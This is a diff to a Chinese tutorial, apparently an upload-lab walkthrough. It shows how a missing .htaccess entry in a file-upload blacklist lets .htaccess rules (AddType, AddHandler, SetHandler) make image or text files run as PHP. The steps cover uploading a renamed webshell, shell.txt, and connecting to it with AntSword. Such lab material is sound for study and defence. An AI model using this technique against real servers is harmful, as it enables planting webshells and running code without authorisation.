@@ -139,3 +139,45 @@ $deny_ext = array(".php",".php5",".php4",".php3",".php2",".php1",".html",".htm",
 ```
 这里使用黑名单过滤了所有php、jsp、asp可执行文件的后缀，通过后缀名绕过不可行。但是忽略了.htaccess后缀的文件。
 
+>通过 .htaccess 规则，让本不执行脚本的文件（如 .jpg、.png、.txt、.gif）被服务器当成 PHP 脚本执行。
+
+.htaccess最常用的三条解析规则
+
+```text
+# 1. 让jpg当php执行
+AddType application/x-httpd-php .jpg
+
+# 2. 让png当php执行
+AddHandler application/x-httpd-php .png
+
+# 3. 指定某个文件当php执行
+<Files "shell.txt">
+SetHandler application/x-httpd-php
+</Files>
+```
+
+【注意】
+
+Apache 2.2 及以前：默认 AllowOverride All → .htaccess 自动生效
+Apache 2.3.9+ / 2.4.x：默认 AllowOverride None → 完全不读取 .htaccess
+
+建议在2.2及以前版本进行漏洞复现。
+
+重启Apache服务使配置生效。
+
+2.创建并编辑.htaccess文件
+
+在Linux系统中可以直接创建并编辑，在Windows系统中需要先用记事本编辑内容再另存为.htaccess文件。
+
+在.htaccess文件中指定shell.txt文件当php执行,编辑完成后保存并上传。
+
+```php
+<Files "shell.txt">
+SetHandler application/x-httpd-php
+</Files>
+```
+
+3.上传shell.txt文件
+
+修改shell.php后缀为shell.txt,然后上传，上传成功后使用中国蚁剑连接。
+
